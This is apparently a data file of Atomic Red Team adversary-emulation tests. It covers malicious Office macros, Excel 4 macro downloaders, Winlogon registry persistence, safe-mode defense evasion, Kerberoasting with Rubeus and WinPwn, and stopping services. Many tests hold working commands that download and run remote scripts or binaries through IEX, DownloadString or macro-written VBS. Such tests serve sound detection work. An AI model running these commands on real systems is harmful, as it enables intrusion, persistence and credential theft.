T1204.002,User Execution: Malicious File,OSTAP JS version,add560ef-20d6-4011-a937-2c340f930911,"Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{jse_path}`"" For Output As #1`n   Write #1, `""WScript.Quit`""`n   Close #1`n   a = Shell(`""cmd.exe /c wscript.exe //E:jscript #{jse_path}`"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct ""#{ms_product}""
",powershell,,,,powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.jse_path.description: jse file to execute with wscript

input_arguments.jse_path.type: path

input_arguments.jse_path.default: C:\Users\Public\art.jse

input_arguments.ms_product.description: Maldoc application Word or Excel

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1204.002,User Execution: Malicious File,Office launching .bat file from AppData,9215ea92-1ded-41b7-9cd6-79f9a78397aa,Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.,windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macrocode = ""   Open `""#{bat_path}`"" For Output As #1`n   Write #1, `""calc.exe`""`n   Close #1`n   a = Shell(`""cmd.exe /c #{bat_path} `"", vbNormalFocus)`n""
Invoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}
",powershell,,,"Remove-Item #{bat_path} -ErrorAction Ignore
Get-Process | Where-Object { $_.MainModule.FileName -like ""*calculator*"" } | Stop-Process
",powershell,"dependencies.0.description: Microsoft #{ms_product} must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.bat_path.description: Path to malicious .bat file

input_arguments.bat_path.type: string

input_arguments.bat_path.default: $(""$env:temp\art1204.bat"")

input_arguments.ms_product.description: Maldoc application Word or Excel

input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1204.002,User Execution: Malicious File,Excel 4 Macro,4ea1fc97-8a46-4b4e-ba48-af43d2a98052,"This module creates an Excel 4 Macro (XLM) enabled spreadsheet and executes it. The XLM will first write a ""malicious""
VBS file to %TEMP%, then execute this file. The VBS will download Process Explorer to the same directory (%TEMP%) and exec.

A note regarding this module. By default, this module will pull the current username from the system and places it into the macro. If
you'd like to utilize the ""=GET.WORKSPACE(26)"" method, that many maldoc authors use, you will need to ensure that the User Name associated
with Excel matches that of the local system. This username can be found under Files -> Options -> Username
",windows,,,"$fname = ""$env:TEMP\atomic_redteam_x4m_exec.vbs""
$fname1 = ""$env:TEMP\procexp.exe""
if (Test-Path $fname) {
  Remove-Item $fname
  Remove-Item $fname1
}

$xlApp = New-Object -COMObject ""Excel.Application""
$xlApp.Visible = $True
$xlApp.DisplayAlerts = $False
$xlBook = $xlApp.Workbooks.Add()
$sheet = $xlBook.Excel4MacroSheets.Add()

if (""#{uname}"" -ne """") {
  $sheet.Cells.Item(1,1) = ""#{uname}""
} else {
  $sheet.Cells.Item(1,1) = ""=GET.WORKSPACE(26)""
}

$sheet.Cells.Item(2,1) = ""procexp.exe""
$sheet.Cells.Item(3,1) = ""atomic_redteam_x4m_exec.vbs""
$sheet.Cells.Item(4,1) = ""=IF(ISNUMBER(SEARCH(`""64`"",GET.WORKSPACE(1))), GOTO(A5),)""
$sheet.Cells.Item(5,1) = ""=FOPEN(`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"", 3)""
$sheet.Cells.Item(6,1) = ""=FWRITELN(A5, `""url = `""`""#{download_url}`""`""`"")""
$sheet.Cells.Item(7,1) = ""=FWRITELN(A5, `""`"")""
$sheet.Cells.Item(8,1) = ""=FWRITELN(A5, `""Set winHttp = CreateObject(`""`""WinHTTP.WinHTTPrequest.5.1`""`"")`"")""
$sheet.Cells.Item(9,1) = ""=FWRITELN(A5, `""winHttp.Open `""`""GET`""`"", url, False`"")""
$sheet.Cells.Item(10,1) = ""=FWRITELN(A5, `""winHttp.Send`"")""
$sheet.Cells.Item(11,1) = ""=FWRITELN(A5, `""If winHttp.Status = 200 Then`"")""
$sheet.Cells.Item(12,1) = ""=FWRITELN(A5, `""Set oStream = CreateObject(`""`""ADODB.Stream`""`"")`"")""
$sheet.Cells.Item(13,1) = ""=FWRITELN(A5, `""oStream.Open`"")""
$sheet.Cells.Item(14,1) = ""=FWRITELN(A5, `""oStream.Type = 1`"")""
$sheet.Cells.Item(15,1) = ""=FWRITELN(A5, `""oStream.Write winHttp.responseBody`"")""
$sheet.Cells.Item(16,1) = ""=FWRITELN(A5, `""oStream.SaveToFile `""`""C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`""`"", 2`"")""
$sheet.Cells.Item(17,1) = ""=FWRITELN(A5, `""oStream.Close`"")""
$sheet.Cells.Item(18,1) = ""=FWRITELN(A5, `""End If`"")""
$sheet.Cells.Item(19,1) = ""=FCLOSE(A5)""
$sheet.Cells.Item(20,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A3&`""`"")""
$sheet.Cells.Item(21,1) = ""=WAIT(NOW()+`""00:00:05`"")""
$sheet.Cells.Item(22,1) = ""=EXEC(`""explorer.exe C:\Users\`""&A1&`""\AppData\Local\Temp\`""&A2&`""`"")""
$sheet.Cells.Item(23,1) = ""=HALT()""
$sheet.Cells.Item(1,1).Name = ""runme""
$xlApp.Run(""runme"")
$xlApp.Quit()

[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlBook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($xlApp) | Out-Null
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()

Remove-Variable xlBook
Remove-Variable xlApp
",powershell,,,"Stop-Process -Name ""procexp*"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\atomic_redteam_x4m_exec.vbs"" -ErrorAction Ignore
Remove-Item ""$env:TEMP\procexp.exe"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Microsoft Excel must be installed

dependencies.0.prereq_command: try {
  New-Object -COMObject ""Excel.Application"" | Out-Null
  Stop-Process -Name ""Excel""
  exit 0
} catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Excel manually to meet this requirement""

","input_arguments.download_url.description: Download URL

input_arguments.download_url.type: string

input_arguments.download_url.default: https://live.sysinternals.com/procexp.exe

input_arguments.uname.description: Username for pathing

input_arguments.uname.type: string

input_arguments.uname.default: $env:Username

"
T1204.002,User Execution: Malicious File,Headless Chrome code execution via VBA,a19ee671-ed98-4e9d-b19c-d1954a51585a,"This module uses Google Chrome combined with ScriptControl to achieve code execution. It spawns a local
webserver hosting our malicious payload. Headless Google Chrome will then reach out to this webserver
and pull down the script and execute it. By default the payload will execute calc.exe on the system.
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1204.002\src\chromeexec-macrocode.txt"" -officeProduct ""Word"" -sub ""ExecChrome""
",powershell,,,"Stop-Process -name mshta
",powershell,"dependencies.0.description: Microsoft Word must be installed

dependencies.0.prereq_command: try {
  $wdApp = New-Object -COMObject ""Word.Application""
  Stop-Process -Name ""winword""
  exit 0 } catch { exit 1 }

dependencies.0.get_prereq_command: Write-Host ""You will need to install Microsoft Word manually to meet this requirement""

dependencies.1.description: Google Chrome must be installed

dependencies.1.prereq_command: try {
  $chromeInstalled = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe').'(Default)').VersionInfo.FileName
  exit 0
} catch { exit 1 }

dependencies.1.get_prereq_command: Write-Host ""You will need to install Google Chrome manually to meet this requirement""

",
T1204.002,User Execution: Malicious File,Potentially Unwanted Applications (PUA),02f35d62-9fdc-4a97-b899-a5d9a876d295,"The Potentially Unwanted Applications (PUA) protection feature in antivirus software can identify and block PUAs from downloading and installing on endpoints in your network. These applications are not considered viruses, malware, or other types of threats, but might perform actions on endpoints that adversely affect their performance or use. This file is similar to EICAR test virus file, but is considered a Potentially Unwanted Application (PUA) instead of a VIRUS (i.e. not actually malicious, but is flagged as it to verify anti-pua protection).
",windows,,,"Invoke-WebRequest #{pua_url} -OutFile #{pua_file}
& ""#{pua_file}""
",powershell,False,,"Stop-Process -name PotentiallyUnwanted
Remove-Item #{pua_file} -ErrorAction Ignore
",,,"input_arguments.pua_url.description: url to PotentiallyUnwanted.exe

input_arguments.pua_url.type: url

input_arguments.pua_url.default: http://amtso.eicar.org/PotentiallyUnwanted.exe

input_arguments.pua_file.description: path to PotentiallyUnwanted.exe

input_arguments.pua_file.type: path

input_arguments.pua_file.default: $env:TEMP/PotentiallyUnwanted.exe

"
T1204.002,User Execution: Malicious File,Office Generic Payload Download,5202ee05-c420-4148-bf5e-fd7f7d24850c,"This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
Required input agruments are c2_domain and file_name
Execution is handled by [Invoke-MalDoc](https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
Example for c2 server located at 127.0.0.1 for the file test.txt which is nested below the parent directory in the tests/my-test folder
Example input args for file in root directory c2-domain = 127.0.0.1, file-name = test.txt
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
$macroCode = Get-Content ""#{macro_path}"" -Raw
$URL = ""#{c2_domain}"" + ""/"" + ""#{c2_parent_directory}""
$macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', ""#{file_name}""
Invoke-MalDoc -macroCode $macroCode -officeProduct ""#{ms_product}""
",powershell,,,"Remove-Item ""C:\Users\$env:username\Desktop\#{file_name}"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Destination c2_domain name or IP address must be set to a running HTTP server.

dependencies.0.prereq_command: if (#{c2_domain}) (exit 0) else (exit 1)

dependencies.0.get_prereq_command: Write-Host ""Destination c2 server domain name or IP address must be set and reachable for HTTP service""

dependencies.1.description: Microsoftt #{ms_product} must be installed

dependencies.1.prereq_command: try {
  New-Object -COMObject ""#{ms_product}.Application"" | Out-Null
  $process = ""#{ms_product}""; if ( $process -eq ""Word"") {$process = ""winword""}
  Stop-Process -Name $process
  exit 0
} catch { exit 1 }

dependencies.1.get_prereq_command: Write-Host ""You will need to install Microsoft #{ms_product} manually to meet this requirement""

","input_arguments.macro_path.description: Location of file which will be converted to a VBA macro


input_arguments.macro_path.type: path

input_arguments.macro_path.default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt

input_arguments.c2_domain.description: This required variable points to a user defined HTTP server that will host the file_name in the c2_parent_directory.


input_arguments.c2_domain.type: url

input_arguments.c2_domain.default: None

input_arguments.c2_parent_directory.description: Parent directory where you have the ""malicious"" file on c2_domain server.
Will default to root directory. Forward slashes are not needed at begining or ending of directory path


input_arguments.c2_parent_directory.type: path

input_arguments.c2_parent_directory.default: 

input_arguments.file_name.description: ""Malicious"" file to be downloaded.
This required file needs to be place on the user provided c2 domain
Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt


input_arguments.file_name.type: string

input_arguments.file_name.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/test9-example-payload.txt

input_arguments.ms_product.description: Maldoc application Word or Excel


input_arguments.ms_product.type: string

input_arguments.ms_product.default: Word

"
T1204.002,User Execution: Malicious File,LNK Payload Download,581d7521-9c4b-420e-9695-2aec5241167f,This lnk files invokes powershell to download putty from the internet and opens the file. https://twitter.com/ankit_anubhav/status/1518932941090410496,windows,,,"Invoke-WebRequest -OutFile $env:Temp\test10.lnk ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk""
$file1 = ""$env:Temp\test10.lnk""
Start-Process $file1
Start-Sleep -s 10
taskkill /IM a.exe /F
",powershell,,,"$file1 = ""$env:Temp\test10.lnk""
$file2 = ""$env:Temp\a.exe""
Remove-Item $file1 -ErrorAction Ignore
Remove-Item $file2 -ErrorAction Ignore",,,
T1204.002,User Execution: Malicious File,Mirror Blast Emulation,24fd9719-7419-42dd-bce6-ab3463110b3c,"Emulates the JS -> MSI chain of the MirrorBlast T505 campaign by executing an xlsm file designed. 
Requires the 32 bit version of Office to run. [MirrorBlast Campaign Analysis](https://blog.morphisec.com/explosive-new-mirrorblast-campaign-targets-financial-companies)
",windows,,,"Cd ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs""
New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name ""VBAWarnings"" -Value ""1"" -PropertyType DWORD -Force | Out-Null
& '.\Excel 2016.lnk' ""PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm""",powershell,,,"reg delete ""HKCU\SOFTWARE\Microsoft\Office\16.0\Excel\Security"" /v ""VBAWarnings"" /f",,,
T1569.001,System Services: Launchctl,Launchctl,6fb61988-724e-4755-a595-07743749d4e2,"Utilize launchctl
",macos,,,"launchctl submit -l #{label_name} -- #{executable_path}
",bash,,,"launchctl remove #{label_name}
",,,"input_arguments.executable_path.description: Path of the executable to run.

input_arguments.executable_path.type: path

input_arguments.executable_path.default: /System/Applications/Calculator.app/Contents/MacOS/Calculator

input_arguments.label_name.description: Path of the executable to run.

input_arguments.label_name.type: string

input_arguments.label_name.default: evil

"
T1562.009,Impair Defenses: Safe Boot Mode,Safe Mode Boot,2a78362e-b79a-4482-8e24-be397bce4d85,Allows adversaries to abuse safe mode to disable endpoint defenses that may not start with limited boot,windows,,,bcdedit /set safeboot network,command_prompt,True,,bcdedit /deletevalue {current} safeboot,,,
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,Winlogon Shell Key Persistence - PowerShell,bf9f9d65-ee4d-4c3e-a843-777d04f19c38,"PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
",windows,,,"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, #{binary_to_execute}"" -Force
",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Shell"" -Force -ErrorAction Ignore
",,,"input_arguments.binary_to_execute.description: Path of binary to execute

input_arguments.binary_to_execute.type: path

input_arguments.binary_to_execute.default: C:\Windows\System32\cmd.exe

"
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,Winlogon Userinit Key Persistence - PowerShell,fb32c935-ee2e-454b-8fa3-1c46b42e8dfb,"PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
",windows,,,"Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, #{binary_to_execute}"" -Force
",powershell,,,"Remove-ItemProperty -Path ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Userinit"" -Force -ErrorAction Ignore
",,,"input_arguments.binary_to_execute.description: Path of binary to execute

input_arguments.binary_to_execute.type: path

input_arguments.binary_to_execute.default: C:\Windows\System32\cmd.exe

"
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,Winlogon Notify Key Logon Persistence - PowerShell,d40da266-e073-4e5a-bb8b-2b385023e5f9,"PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.

Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.

Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.
",windows,,,"New-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""DllName"" ""#{binary_to_execute}"" -Type ExpandString -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Logon"" ""#{function_to_execute}"" -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Impersonate"" 1 -Type DWord -Force
Set-ItemProperty ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam"" ""Asynchronous"" 0 -Type DWord -Force
",powershell,,,"Remove-Item ""HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify"" -Force -ErrorAction Ignore
",,,"input_arguments.binary_to_execute.description: Path of notification package to execute

input_arguments.binary_to_execute.type: path

input_arguments.binary_to_execute.default: C:\Windows\Temp\atomicNotificationPackage.dll

input_arguments.function_to_execute.description: Function in notification package to execute

input_arguments.function_to_execute.type: string

input_arguments.function_to_execute.default: AtomicTestFunction

"
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,Winlogon HKLM Shell Key Persistence - PowerShell,95a3c42f-8c88-4952-ad60-13b81d929a9d,"PowerShell code to set Winlogon shell key to execute a binary at logon along with explorer.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
",windows,,,"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Shell"" ""explorer.exe, #{binary_to_execute}"" -Force
",powershell,,,"Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Shell"" -Force -ErrorAction Ignore
",,,"input_arguments.binary_to_execute.description: Path of binary to execute

input_arguments.binary_to_execute.type: path

input_arguments.binary_to_execute.default: C:\Windows\System32\cmd.exe

"
T1547.004,Boot or Logon Autostart Execution: Winlogon Helper DLL,Winlogon HKLM Userinit Key Persistence - PowerShell,f9b8daff-8fa7-4e6a-a1a7-7c14675a545b,"PowerShell code to set Winlogon userinit key to execute a binary at logon along with userinit.exe.

Upon successful execution, PowerShell will modify a registry value to execute cmd.exe upon logon/logoff.
",windows,,,"Set-ItemProperty ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" ""Userinit"" ""Userinit.exe, #{binary_to_execute}"" -Force
",powershell,,,"Remove-ItemProperty -Path ""HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\"" -Name ""Userinit"" -Force -ErrorAction Ignore
",,,"input_arguments.binary_to_execute.description: Path of binary to execute

input_arguments.binary_to_execute.type: path

input_arguments.binary_to_execute.default: C:\Windows\System32\cmd.exe

"
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,Request for service tickets,3f987809-3681-43c8-bcd8-b3ff3a28533a,"This test uses the Powershell Empire Module: Invoke-Kerberoast.ps1
The following are further sources and credits for this attack:
[Kerberoasting Without Mimikatz source] (https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)
[Invoke-Kerberoast source] (https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
when executed successfully , the test displays available services with their hashes. 
If the testing domain doesn't have any service principal name configured, there is no output
",windows,,,"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing)
Invoke-Kerberoast | fl
",powershell,,,,,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

",
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,Rubeus kerberoast,14625569-6def-4497-99ac-8e7817105b55,"Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
",windows,,,"klist purge
cmd.exe /c ""#{local_folder}\#{local_executable}"" kerberoast #{flags} /outfile:""#{local_folder}\#{out_file}""
",powershell,False,,"Remove-Item ""#{local_folder}\#{out_file}"" -ErrorAction Ignore
",powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

dependencies.1.description: Rubeus must exist

dependencies.1.prereq_command: if(Test-Path -Path ""#{local_folder}\#{local_executable}"") {exit 0} else {exit 1}

dependencies.1.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-Webrequest -Uri #{rubeus_url} -OutFile ""#{local_folder}\#{local_executable}""

","input_arguments.local_folder.description: Local path of Rubeus executable

input_arguments.local_folder.type: path

input_arguments.local_folder.default: PathToAtomicsFolder\..\ExternalPayloads

input_arguments.local_executable.description: name of the rubeus executable

input_arguments.local_executable.type: string

input_arguments.local_executable.default: rubeus.exe

input_arguments.out_file.description: file where command results are stored

input_arguments.out_file.type: string

input_arguments.out_file.default: rubeus_output.txt

input_arguments.rubeus_url.description: URL of Rubeus executable

input_arguments.rubeus_url.type: url

input_arguments.rubeus_url.default: https://github.com/morgansec/Rubeus/raw/de21c6607e9a07182a2d2eea20bb67a22d3fbf95/Rubeus/bin/Debug/Rubeus45.exe

input_arguments.flags.description: command flags you would like to run (optional and blank by default)

input_arguments.flags.type: string

input_arguments.flags.default: None

"
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,Extract all accounts in use as SPN using setspn,e6f4affd-d826-4871-9a62-6c9004b8fe06,"The following test will utilize setspn to extract the Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output all the SPNs for the related domain. 
",windows,,,"setspn -T #{domain_name} -Q */*
",command_prompt,,,,powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

","input_arguments.domain_name.description: The Domain Name to lookup against

input_arguments.domain_name.type: string

input_arguments.domain_name.default: %USERDNSDOMAIN%

"
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,Request A Single Ticket via PowerShell,988539bc-2ed7-4e62-aec6-7c5cf6680863,"The following test will utilize native PowerShell Identity modules to query the domain to extract the Service Principal Names for a single computer. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the endpoint in question.
",windows,,,"Add-Type -AssemblyName System.IdentityModel
$ComputerFQDN=$env:LogonServer.trimStart('\') + ""."" + $env:UserDnsDomain
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList ""HTTP/$ComputerFQDN"" 
",powershell,,,,powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

",
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,Request All Tickets via PowerShell,902f4ed2-1aba-4133-90f2-cff6d299d6da,"The following test will utilize native PowerShell Identity modules to query the domain to extract allthe Service Principal Names. This behavior is typically used during a kerberos or silver ticket attack. 
A successful execution will output the SPNs for the domain in question.
",windows,,,"Add-Type -AssemblyName System.IdentityModel  
setspn.exe -T #{domain_name} -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
",powershell,,,,powershell,"dependencies.0.description: Computer must be domain joined

dependencies.0.prereq_command: if((Get-CIMInstance -Class Win32_ComputerSystem).PartOfDomain) {exit 0} else {exit 1}

dependencies.0.get_prereq_command: Write-Host Joining this computer to a domain must be done manually

","input_arguments.domain_name.description: The Domain Name to lookup against

input_arguments.domain_name.type: string

input_arguments.domain_name.default: %USERDNSDOMAIN%

"
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,WinPwn - Kerberoasting,78d10e20-c874-45f2-a9df-6fea0120ec27,Kerberoasting technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Kerberoasting -consoleoutput -noninteractive",powershell,,,,,,
T1558.003,Steal or Forge Kerberos Tickets: Kerberoasting,WinPwn - PowerSharpPack - Kerberoasting Using Rubeus,29094950-2c96-4cbd-b5e4-f7c65079678f,PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command ""kerberoast /format:hashcat /nowrap""",powershell,,,,,,
T1489,Service Stop,Windows - Stop service using Service Controller,21dfb440-830d-4c86-a3e5-2a491d5a8d04,"Stops a specified service using the sc.exe command. Upon execution, if the spooler service was running infomration will be displayed saying
it has changed to a state of STOP_PENDING. If the spooler service was not running ""The service has not been started."" will be displayed and it can be
started by running the cleanup command.
",windows,,,"sc.exe stop #{service_name}
",command_prompt,True,,"sc.exe start #{service_name} >nul 2>&1
",,,"input_arguments.service_name.description: Name of a service to stop

input_arguments.service_name.type: string

input_arguments.service_name.default: spooler

"
T1489,Service Stop,Windows - Stop service using net.exe,41274289-ec9c-4213-bea4-e43c4aa57954,"Stops a specified service using the net.exe command. Upon execution, if the service was running ""The Print Spooler service was stopped successfully.""
will be displayed. If the service was not running, ""The Print Spooler service is not started."" will be displayed and it can be
started by running the cleanup command.
",windows,,,"net.exe stop #{service_name}
",command_prompt,True,,"net.exe start #{service_name} >nul 2>&1
",,,"input_arguments.service_name.description: Name of a service to stop

input_arguments.service_name.type: string

input_arguments.service_name.default: spooler

"
T1489,Service Stop,Windows - Stop service by killing process,f3191b84-c38b-400b-867e-3a217a27795f,"Stops a specified service killng the service's process.
This technique was used by WannaCry. Upon execution, if the spoolsv service was running ""SUCCESS: The process ""spoolsv.exe"" with PID 2316 has been terminated.""
will be displayed. If the service was not running ""ERROR: The process ""spoolsv.exe"" not found."" will be displayed and it can be
started by running the cleanup command.
",windows,,,"taskkill.exe /f /im #{process_name}
",command_prompt,,,,,,"input_arguments.process_name.description: Name of a process to kill

input_arguments.process_name.type: string

input_arguments.process_name.default: spoolsv.exe

"
T1218.002,Signed Binary Proxy Execution: Control Panel,Control Panel Items,037e9d8a-9e46-4255-8b33-2ae3b545ca6f,"This test simulates an adversary leveraging control.exe
Upon execution calc.exe will be launched
",windows,,,"control.exe ""#{cpl_file_path}""
",command_prompt,,,,powershell,"dependencies.0.description: Cpl file must exist on disk at specified location (#{cpl_file_path})

dependencies.0.prereq_command: if (Test-Path ""#{cpl_file_path}"") {exit 0} else {exit 1}

dependencies.0.get_prereq_command: New-Item -Type Directory (split-path ""#{cpl_file_path}"") -ErrorAction ignore | Out-Null
Invoke-WebRequest ""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.002/bin/calc.cpl"" -OutFile ""#{cpl_file_path}""

","input_arguments.cpl_file_path.description: path to cpl file

input_arguments.cpl_file_path.type: path

input_arguments.cpl_file_path.default: PathToAtomicsFolder\T1218.002\bin\calc.cpl

"
T1074.001,Data Staged: Local Data Staging,Stage data from Discovery.bat,107706a5-6f9f-451a-adae-bab8c667829f,"Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
verify that the file is saved in the temp directory.
",windows,,,"Invoke-WebRequest ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.bat"" -OutFile #{output_file}
",powershell,,,"Remove-Item -Force #{output_file} -ErrorAction Ignore
",,,"input_arguments.output_file.description: Location to save downloaded discovery.bat file

